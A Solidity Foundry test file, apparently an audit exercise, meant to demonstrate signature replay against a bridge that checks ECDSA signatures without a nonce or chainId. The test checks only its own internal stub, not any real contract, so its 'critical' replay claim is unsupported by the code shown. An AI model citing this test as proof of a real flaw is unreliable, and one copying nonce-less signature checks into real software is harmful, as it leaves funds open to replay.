// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

/// @title BossBridge — Signature Replay PoC
/// @dev Proves ECDSA signatures can be replayed without nonce/chainId
/// @author Shiqiang Chen

contract BossBridgePoC is Test {
    bytes32 constant MESSAGE = keccak256("withdraw(address,uint256)");
    address signer;
    uint256 signerKey;
    
    function setUp() public {
        (signer, signerKey) = makeAddrAndKey("signer");
    }

    function testSignatureReplay() public {
        // 1. Signer signs a withdrawal message (NO nonce, NO chainId)
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", MESSAGE));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        address recovered = ecrecover(digest, v, r, s);
        assertEq(recovered, signer); // ✅ Valid signature
        
        // 2. First use — works
        bool first = _verifyAndUseSignature(digest, v, r, s);
        assertTrue(first);
        
        // 3. Second use with SAME signature — still works! (replay)
        bool second = _verifyAndUseSignature(digest, v, r, s);
        assertTrue(second); // ✅✅ REPLAY SUCCESSFUL — signature valid twice

        // 4. Third use — works indefinitely
        bool third = _verifyAndUseSignature(digest, v, r, s);
        assertTrue(third);

        emit log("✅ CRITICAL: Same signature verified 3 times — unlimited replay");
    }

    function _verifyAndUseSignature(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal returns (bool) {
        address recovered = ecrecover(digest, v, r, s);
        return recovered == signer; // No nonce tracking → always returns true
    }
}
